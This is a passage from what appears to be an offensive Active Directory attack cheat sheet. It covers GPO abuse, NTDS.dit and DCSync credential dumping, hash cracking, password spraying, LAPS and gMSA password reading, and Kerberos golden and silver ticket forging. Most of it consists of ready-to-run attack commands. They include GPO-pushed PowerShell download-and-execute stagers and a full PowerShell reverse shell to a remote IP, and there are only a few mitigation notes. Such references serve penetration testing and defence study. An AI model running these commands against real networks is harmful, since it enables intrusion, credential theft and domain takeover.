credentials\nscanner/smb/smb_enumshares post/windows/gather/enum_shares post/windows/gather/credentials/gpp CrackMapExec modules\ncme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password Get-GPPPassword\n# with a NULL session Get-GPPPassword.py -no-pass \u0026#39;DOMAIN_CONTROLLER\u0026#39; # with cleartext credentials Get-GPPPassword.py \u0026#39;DOMAIN\u0026#39;/\u0026#39;USER\u0026#39;:\u0026#39;PASSWORD\u0026#39;@\u0026#39;DOMAIN_CONTROLLER\u0026#39; # pass-the-hash Get-GPPPassword.py -hashes \u0026#39;LMhash\u0026#39;:\u0026#39;NThash\u0026#39; \u0026#39;DOMAIN\u0026#39;/\u0026#39;USER\u0026#39;:\u0026#39;PASSWORD\u0026#39;@\u0026#39;DOMAIN_CONTROLLER\u0026#39; Mitigations # Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences. Delete existing GPP xml files in SYSVOL containing passwords. Don’t put passwords in files that are accessible by all authenticated users. Exploit Group Policy Objects GPO # Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner\n:triangular_flag_on_post: GPO Priorization : Organization Unit \u0026gt; Domain \u0026gt; Site \u0026gt; Local\nGPO are stored in the DC in \\\\\u0026lt;domain.dns\u0026gt;\\SYSVOL\\\u0026lt;domain.dns\u0026gt;\\Policies\\\u0026lt;GPOName\u0026gt;\\, inside two folders User and Machine. If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at Machine\\Preferences\\ScheduledTasks.\n:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: gpupdate /force.\nFind vulnerable GPO # Look a GPLink where you have the Write right.\nGet-DomainObjectAcl -Identity \u0026#34;SuperSecureGPO\u0026#34; -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match \u0026#34;GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner\u0026#34;)} Abuse GPO with SharpGPOAbuse # # Build and configure SharpGPOAbuse $ git clone https://github.com/FSecureLABS/SharpGPOAbuse $ Install-Package CommandLineParser -Version 1.9.3.15 $ ILMerge.exe /out:C:\\SharpGPOAbuse.exe C:\\Release\\SharpGPOAbuse.exe C:\\Release\\CommandLine.dll # Adding User Rights .\\SharpGPOAbuse.exe --AddUserRights --UserRights \u0026#34;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight\u0026#34; --UserAccount bob.smith --GPOName \u0026#34;Vulnerable GPO\u0026#34; # Adding a Local Admin .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName \u0026#34;Vulnerable GPO\u0026#34; # Configuring a User or Computer Logon Script .\\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents \u0026#34;powershell.exe -nop -w hidden -c \\\u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://10.1.1.10:80/a\u0026#39;))\\\u0026#34;\u0026#34; --GPOName \u0026#34;Vulnerable GPO\u0026#34; # Configuring a Computer or User Immediate Task # /!\\ Intended to \u0026#34;run once\u0026#34; per GPO refresh, not run once per system .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \u0026#34;Update\u0026#34; --Author DOMAIN\\Admin --Command \u0026#34;cmd.exe\u0026#34; --Arguments \u0026#34;/c powershell.exe -nop -w hidden -c \\\u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://10.1.1.10:80/a\u0026#39;))\\\u0026#34;\u0026#34; --GPOName \u0026#34;Vulnerable GPO\u0026#34; .\\SharpGPOAbuse.exe --AddComputerTask --GPOName \u0026#34;VULNERABLE_GPO\u0026#34; --Author \u0026#39;LAB.LOCAL\\User\u0026#39; --TaskName \u0026#34;EvilTask\u0026#34; --Arguments \u0026#34;/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND \u0026#34; --Command \u0026#34;cmd.exe\u0026#34; --Force Abuse GPO with PowerGPOAbuse # https://github.com/rootSySdk/PowerGPOAbuse PS\u0026gt; . .\\PowerGPOAbuse.ps1 # Adding a localadmin PS\u0026gt; Add-LocalAdmin -Identity \u0026#39;Bobby\u0026#39; -GPOIdentity \u0026#39;SuperSecureGPO\u0026#39; # Assign a new right PS\u0026gt; Add-UserRights -Rights \u0026#34;SeLoadDriverPrivilege\u0026#34;,\u0026#34;SeDebugPrivilege\u0026#34; -Identity \u0026#39;Bobby\u0026#39; -GPOIdentity \u0026#39;SuperSecureGPO\u0026#39; # Adding a New Computer/User script PS\u0026gt; Add-ComputerScript/Add-UserScript -ScriptName \u0026#39;EvilScript\u0026#39; -ScriptContent $(Get-Content evil.ps1) -GPOIdentity \u0026#39;SuperSecureGPO\u0026#39; # Create an immediate task PS\u0026gt; Add-GPOImmediateTask -TaskName \u0026#39;eviltask\u0026#39; -Command \u0026#39;powershell.exe /c\u0026#39; -CommandArguments \u0026#34;\u0026#39;$(Get-Content evil.ps1)\u0026#39;\u0026#34; -Author Administrator -Scope Computer/User -GPOIdentity \u0026#39;SuperSecureGPO\u0026#39; Abuse GPO with pyGPOAbuse # $ git clone https://github.com/Hackndo/pyGPOAbuse # Add john user to local administrators group (Password: H4x00r123..) ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \u0026#34;12345677-ABCD-9876-ABCD-123456789012\u0026#34; # Reverse shell example ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \u0026#34;12345677-ABCD-9876-ABCD-123456789012\u0026#34; \\ -powershell \\ -command \u0026#34;\\$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.20.0.2\u0026#39;,1234);\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2\u0026gt;\u0026amp;1 | Out-String );\\$sendback2 = \\$sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\u0026#34; \\ -taskname \u0026#34;Completely Legit Task\u0026#34; \\ -description \u0026#34;Dis is legit, pliz no delete\u0026#34; \\ -user Abuse GPO with PowerView # # Enumerate GPO Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} # New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments \u0026#39;-NoP -NonI -W Hidden -Enc AAAAAAA...\u0026#39; -Force Abuse GPO with StandIn # # Add a local administrator StandIn.exe --gpo --filter Shards --localadmin user002 # Set custom right to a user StandIn.exe --gpo --filter Shards --setuserrights user002 --grant \u0026#34;SeDebugPrivilege,SeLoadDriverPrivilege\u0026#34; # Execute a custom command StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author \u0026#34;REDHOOK\\Administrator\u0026#34; --command \u0026#34;C:\\I\\do\\the\\thing.exe\u0026#34; --args \u0026#34;with args\u0026#34; Dumping AD Domain Credentials # You will need the following files to extract the ntds :\nNTDS.dit file SYSTEM hive (C:\\Windows\\System32\\SYSTEM) Usually you can find the ntds in two locations : systemroot\\NTDS\\ntds.dit and systemroot\\System32\\ntds.dit.\nsystemroot\\NTDS\\ntds.dit stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data). systemroot\\System32\\ntds.dit is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD. However you can change the location to a custom one, you will need to query the registry to get the current location.\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \u0026#34;DSA Database file\u0026#34; Using ndtsutil # C:\\\u0026gt;ntdsutil ntdsutil: activate instance ntds ntdsutil: ifm ifm: create full c:\\pentest ifm: quit ntdsutil: quit or\nntdsutil \u0026#34;ac i ntds\u0026#34; \u0026#34;ifm\u0026#34; \u0026#34;create full c:\\temp\u0026#34; q q Using Vshadow # vssadmin create shadow /for=C : Copy Shadow_Copy_Volume_Name\\windows\\ntds\\ntds.dit c:\\ntds.dit You can also use the Nishang script, available at : https://github.com/samratashok/nishang\nImport-Module .\\Copy-VSS.ps1 Copy-VSS Copy-VSS -DestinationDir C:\\ShadowCopy\\ Using vssadmin # vssadmin create shadow /for=C: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ShadowCopy copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\ShadowCopy Using DiskShadow (a Windows signed binary) # diskshadow.txt contains : set context persistent nowriters add volume c: alias someAlias create expose %someAlias% z: exec \u0026#34;cmd.exe\u0026#34; /c copy z:\\windows\\ntds\\ntds.dit c:\\exfil\\ntds.dit delete shadows volume %someAlias% reset then: NOTE - must be executed from C:\\Windows\\System32 diskshadow.exe /s c:\\diskshadow.txt dir c:\\exfil reg.exe save hklm\\system c:\\exfil\\system.bak Using esentutl.exe # Copy/extract a locked file such as the AD Database\nesentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit Extract hashes from ntds.dit # then you need to use secretsdump to extract the hashes, use the LOCAL options to use it on a retrieved ntds.dit\nsecretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL secretsdump also works remotely\n./secretsdump.py -dc-ip IP AD\\administrator@domain -use-vss -pwd-last-set -user-status ./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1 -pwd-last-set: Shows pwdLastSet attribute for each NTDS.DIT account. -user-status: Display whether or not the user is disabled. Alternatives - modules # Metasploit modules\nwindows/gather/credentials/domain_hashdump PowerSploit module\nInvoke-NinjaCopy --path c:\\windows\\NTDS\\ntds.dit --verbose --localdestination c:\\ntds.dit CrackMapExec module\ncme smb 10.10.0.202 -u username -p password --ntds vss cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default Using Mimikatz DCSync # Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.\n# DCSync only one user mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt # DCSync all users of the domain mimikatz# lsadump::dcsync /domain:htb.local /all /csv :warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.\nUsing Mimikatz sekurlsa # Dumps credential data in an Active Directory domain when run on a Domain Controller. :warning: Requires administrator access with debug or Local SYSTEM rights\nsekurlsa::krbtgt lsadump::lsa /inject /name:krbtgt Crack NTLM hashes with hashcat # Useful when you want to have the clear text password or when you need to make stats about weak passwords.\nRecommended wordlists:\nRockyou.txt Have I Been Pwned founds Weakpass.com Read More at Methodology and Resources/Hash Cracking.md # Basic wordlist # (-O) will Optimize for 32 characters or less passwords # (-w 4) will set the workload to \u0026#34;Insane\u0026#34; $ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2 # Generate a custom mask based on a wordlist $ git clone https://github.com/iphelix/pack/blob/master/README $ python2 statsgen.py ../hashcat.potfile -o hashcat.mask $ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask :warning: If the password is not a confidential data (challenges/ctf), you can use online \u0026ldquo;cracker\u0026rdquo; like :\nhashmob.net crackstation.net hashes.com User Hunting # Sometimes you need to find a machine where a specific user is logged in. You can remotely query every machines on the network to get a list of the users\u0026rsquo;s sessions.\nCrackMapExec cme smb 10.10.10.0/24 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; --sessions SMB 10.10.10.10 445 WIN-8OJFTLMU1IG [+] Enumerated sessions SMB 10.10.10.10 445 WIN-8OJFTLMU1IG \\\\10.10.10.10 User:Administrator Impacket Smbclient $ impacket-smbclient Administrator@10.10.10.10 # who host: \\\\10.10.10.10, user: Administrator, active: 1, idle: 0 PowerView Invoke-UserHunter # Find computers were a Domain Admin OR a specified user has a session Invoke-UserHunter Invoke-UserHunter -GroupName \u0026#34;RDPUsers\u0026#34; Invoke-UserHunter -Stealth Password spraying # Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password.\nThe builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.\nMost of the time the best passwords to spray are :\nP@ssw0rd01, Password123, Password1, Hello123, mimikatz Welcome1/Welcome01 $Companyname1 :$Microsoft1 SeasonYear : Winter2019*, Spring2020!, Summer2018?, Summer2020, July2020! Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#) Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0) Kerberos pre-auth bruteforcing # Using kerbrute, a tool to perform Kerberos pre-auth bruteforcing.\nKerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).\nUsername bruteforce root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt Password bruteforce root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username Password spray root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt \u0026#39;123456\u0026#39; -v --delay 100 -o kerbrute-passwordspray-123456.log Spray a pre-generated passwords list # Using crackmapexec and mp64 to generate passwords and spray them against SMB services on the network. crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)` Using DomainPasswordSpray to spray a password against all users of a domain. # https://github.com/dafthack/DomainPasswordSpray Invoke-DomainPasswordSpray -Password Summer2021! # /!\\ be careful with the account lockout ! Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt Using SMBAutoBrute. Invoke-SMBAutoBrute -UserList \u0026#34;C:\\ProgramData\\admins.txt\u0026#34; -PasswordList \u0026#34;Password1, Welcome1, 1qazXDR%+\u0026#34; -LockoutThreshold 5 -ShowVerbose Spray passwords against the RDP service # Using RDPassSpray to target RDP services. git clone https://github.com/xFreed0m/RDPassSpray python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP] Using hydra and ncrack to target RDP services. hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10 ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10 BadPwdCount attribute # The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.\n$ crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 --users LDAP 10.0.2.11 389 dc01 Guest badpwdcount: 0 pwdLastSet: \u0026lt;never\u0026gt; LDAP 10.0.2.11 389 dc01 krbtgt badpwdcount: 0 pwdLastSet: \u0026lt;never\u0026gt; Password in AD User comment # $ crackmapexec ldap domain.lab -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; -M user-desc $ crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 -M get-desc-users GET-DESC... 10.0.2.11 389 dc01 [+] Found following users: GET-DESC... 10.0.2.11 389 dc01 User: Guest description: Built-in account for guest access to the computer/domain GET-DESC... 10.0.2.11 389 dc01 User: krbtgt description: Key Distribution Center Service Account There are 3-4 fields that seem to be common in most AD schemas: UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.\nenum4linux | grep -i desc Get-WmiObject -Class Win32_UserAccount -Filter \u0026#34;Domain=\u0026#39;COMPANYDOMAIN\u0026#39; AND Disabled=\u0026#39;False\u0026#39;\u0026#34; | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID or dump the Active Directory and grep the content.\nldapdomaindump -u \u0026#39;DOMAIN\\john\u0026#39; -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/ Password of Pre-Created Computer Account # When Assign this computer account as a pre-Windows 2000 computer checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account SERVERDEMO$ would have the password serverdemo.\n# Create a machine with default password # must be run from a domain joined device connected to the domain djoin /PROVISION /DOMAIN \u0026lt;fqdn\u0026gt; /MACHINE evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc When you attempt to login using the credential you should have the following error code : STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT. Then you need to change the password with rpcchangepwd.py Reading LAPS Password # Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure.\nDetermine if LAPS is installed # Get-ChildItem \u0026#39;c:\\program files\\LAPS\\CSE\\Admpwd.dll\u0026#39; Get-FileHash \u0026#39;c:\\program files\\LAPS\\CSE\\Admpwd.dll\u0026#39; Get-AuthenticodeSignature \u0026#39;c:\\program files\\LAPS\\CSE\\Admpwd.dll\u0026#39; Extract LAPS password # The \u0026ldquo;ms-mcs-AdmPwd\u0026rdquo; a \u0026ldquo;confidential\u0026rdquo; computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users\nFrom Windows:\nadsisearcher (native binary on Windows 8+)\n([adsisearcher]\u0026#34;(\u0026amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))\u0026#34;).findAll() | ForEach-Object { $_.properties} ([adsisearcher]\u0026#34;(\u0026amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))\u0026#34;).findAll() | ForEach-Object { $_.properties} PowerView\nPS \u0026gt; Import-Module .\\PowerView.ps1 PS \u0026gt; Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime LAPSToolkit\n$ Get-LAPSComputers ComputerName Password Expiration ------------ -------- ---------- example.domain.local dbZu7;vGaI)Y6w1L 02/21/2021 22:29:18 $ Find-LAPSDelegatedGroups $ Find-AdmPwdExtendedRights Powershell AdmPwd.PS\nforeach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}} From Linux:\npyLAPS to read and write LAPS passwords:\n# Read the password of all computers ./pyLAPS.py --action get -u \u0026#39;Administrator\u0026#39; -d \u0026#39;LAB.local\u0026#39; -p \u0026#39;Admin123!\u0026#39; --dc-ip 192.168.2.1 # Write a random password to a specific computer ./pyLAPS.py --action set --computer \u0026#39;PC01$\u0026#39; -u \u0026#39;Administrator\u0026#39; -d \u0026#39;LAB.local\u0026#39; -p \u0026#39;Admin123!\u0026#39; --dc-ip 192.168.2.1 CrackMapExec:\ncrackmapexec smb 10.10.10.10 -u \u0026#39;user\u0026#39; -H \u0026#39;8846f7eaee8fb117ad06bdd830b7586c\u0026#39; -M laps LAPSDumper\npython laps.py -u \u0026#39;user\u0026#39; -p \u0026#39;password\u0026#39; -d \u0026#39;domain.local\u0026#39; python laps.py -u \u0026#39;user\u0026#39; -p \u0026#39;e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\u0026#39; -d \u0026#39;domain.local\u0026#39; -l \u0026#39;dc01.domain.local\u0026#39; ldapsearch\nldapsearch -x -h -D \u0026#34;@\u0026#34; -w -b \u0026#34;dc=\u0026lt;\u0026gt;,dc=\u0026lt;\u0026gt;,dc=\u0026lt;\u0026gt;\u0026#34; \u0026#34;(\u0026amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))\u0026#34; ms-MCS-AdmPwd` Grant LAPS Access # The members of the group \u0026ldquo;Account Operator\u0026rdquo; can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it\u0026rsquo;s possible to add an user to them, and read the LAPS admin password\nAdd-DomainGroupMember -Identity \u0026#39;LAPS ADM\u0026#39; -Members \u0026#39;user1\u0026#39; -Credential $cred -Domain \u0026#34;domain.local\u0026#34; Add-DomainGroupMember -Identity \u0026#39;LAPS READ\u0026#39; -Members \u0026#39;user1\u0026#39; -Credential $cred -Domain \u0026#34;domain.local\u0026#34; Reading GMSA Password # User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.\nGMSA Attributes in the Active Directory # msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) - stores the security principals that can access the GMSA password. msds-ManagedPassword - This attribute contains a BLOB with password information for group-managed service accounts. msDS-ManagedPasswordId - This constructed attribute contains the key identifier for the current managed password data for a group MSA. msDS-ManagedPasswordInterval - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA. Extract NT hash from the Active Directory # GMSAPasswordReader (C#)\n# https://github.com/rvazarkar/GMSAPasswordReader GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT gMSADumper (Python)\n# https://github.com/micahvandeusen/gMSADumper python3 gMSADumper.py -u User -p Password1 -d domain.local Active Directory Powershell\n$gmsa = Get-ADServiceAccount -Identity \u0026#39;SVC_SERVICE_ACCOUNT\u0026#39; -Properties \u0026#39;msDS-ManagedPassword\u0026#39; $blob = $gmsa.\u0026#39;msDS-ManagedPassword\u0026#39; $mp = ConvertFrom-ADManagedPasswordBlob $blob $hash1 = ConvertTo-NTHash -Password $mp.SecureCurrentPassword gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module\nForging Golden GMSA # One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.\nUsing GoldenGMSA # Enumerate all gMSAs GoldenGMSA.exe gmsainfo # Query for a specific gMSA GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # Dump all KDS Root Keys GoldenGMSA.exe kdsinfo # Dump a specific KDS Root Key GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb # Compute gMSA password # --sid \u0026lt;gMSA SID\u0026gt;: SID of the gMSA (required) # --kdskey \u0026lt;Base64-encoded blob\u0026gt;: Base64 encoded KDS Root Key # --pwdid \u0026lt;Base64-encoded blob\u0026gt;: Base64 of msds-ManagedPasswordID attribute value GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode Pass-the-Ticket Golden Tickets # Forging a TGT require the krbtgt NTLM hash\nThe way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used.\nUsing Mimikatz # # Get info - Mimikatz lsadump::lsa /inject /name:krbtgt lsadump::lsa /patch lsadump::trust /patch lsadump::dcsync /user:krbtgt # Forge a Golden ticket - Mimikatz kerberos::purge kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt kerberos::tgt Using Meterpreter # # Get info - Meterpreter(kiwi) dcsync_ntlm krbtgt dcsync krbtgt # Forge a Golden ticket - Meterpreter load kiwi golden_ticket_create -d \u0026lt;domainname\u0026gt; -k \u0026lt;nthashof krbtgt\u0026gt; -s \u0026lt;SID without le RID\u0026gt; -u \u0026lt;user_for_the_ticket\u0026gt; -t \u0026lt;location_to_store_tck\u0026gt; golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck kerberos_ticket_purge kerberos_ticket_use /root/Downloads/pentestlabuser.tck kerberos_ticket_list Using a ticket on Linux # # Convert the ticket kirbi to ccache with kekeo misc::convert ccache ticket.kirbi # Alternatively you can use ticketer from Impacket ./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519 ./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519 export KRB5CCNAME=/home/user/ticket.ccache cat $KRB5CCNAME # NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 If you need to swap ticket between Windows and Linux, you need to convert them with ticket_converter or kekeo.\nroot@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi Converting ccache =\u0026gt; kirbi root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache Converting kirbi =\u0026gt; ccache Mitigations:\nHard to detect because they are legit TGT tickets Mimikatz generate a golden ticket with a life-span of 10 years Pass-the-Ticket Silver Tickets # Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.\n# Create a ticket for the service mimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE # Examples mimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt mimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park # Then use the same steps as a Golden ticket mimikatz $ misc::convert ccache ticket.kirbi root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 Interesting services to target with a silver ticket :\nService Type Service Silver Tickets Attack WMI HOST + RPCSS wmic.exe /authority:\u0026quot;kerberos:DOMAIN\\DC01\u0026quot; /node:\u0026quot;DC01\u0026quot; process call create \u0026quot;cmd /c evil.exe\u0026quot; PowerShell Remoting CIFS + HTTP + (wsman?) New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC WinRM HTTP + wsman New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC Scheduled Tasks HOST schtasks /create /s dc01 /SC WEEKLY /RU \u0026quot;NT Authority\\System\u0026quot; /IN \u0026quot;SCOM Agent Health Check\u0026quot; /IR \u0026quot;C:/shell.ps1\u0026quot; Windows File Share (CIFS) CIFS dir \\\\dc01\\c$ LDAP operations including Mimikatz DCSync LDAP lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt Windows Remote Server Administration Tools RPCSS + LDAP + CIFS / Mitigations:\nSet the attribute \u0026ldquo;Account is Sensitive and Cannot be Delegated\u0026rdquo; to prevent lateral movement with the generated ticket. Kerberoasting # \u0026ldquo;A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. \u0026quot; - MSDN\nAny valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.\nGetUserSPNs from Impacket Suite\n$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies ServicePrincipalName Name MemberOf PasswordLastSet LastLogon -------------------- ------------- -------------------------------------------------------- ------------------- ------------------- active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 21:06:40 2018-12-03 17:11:11 $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2 CrackMapExec Module\n$ crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 --kerberoast output.txt LDAP 10.0.2.11 389 dc01 [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False) LDAP 10.0.2.11 389 dc01 $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9 